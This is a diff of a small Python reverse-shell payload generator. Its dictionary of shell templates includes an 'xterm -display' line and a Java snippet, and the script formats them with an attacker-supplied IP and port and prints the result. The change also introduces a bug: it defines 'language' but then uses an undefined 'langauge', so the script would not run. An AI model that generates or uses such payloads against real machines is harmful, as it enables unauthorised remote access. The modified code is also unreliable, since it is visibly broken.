@@ -22,18 +22,20 @@ payloads = {
  		p.waitFor()""",
  	"xterm": "xterm -display {0}:{1}",
 }
-
+ipaddress = args.ipaddress
+port = args.port
+language = args.langauge
 
 def ReverseShell(ip, port, language):
     lang = language
     payload = print("[+]Payload -> " + payloads[lang].format(ip,port))
     return payload
 
-if args.ipaddress == "" :
+if ipaddress == "" :
     print("please provide the ip!")
-elif args.port == "":
+elif port == "":
     print("Please provide the port!")
-elif args.langauge == "":
+elif langauge == "":
     print("Please provide the payload language!")
 else:
-    cmd = ReverseShell(args.ipaddress,args.port,args.langauge)
+    cmd = ReverseShell(ipaddress,port,langauge)
